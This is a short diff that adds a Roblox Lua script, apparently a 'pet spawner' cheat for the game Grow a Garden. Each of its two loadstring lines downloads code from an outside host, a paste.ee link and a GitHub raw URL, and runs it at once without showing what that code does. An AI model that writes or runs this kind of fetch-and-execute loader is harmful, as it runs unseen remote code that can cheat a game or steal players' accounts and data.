@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://paste.ee/r/0z0zHL9L"))()
+wait(30)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
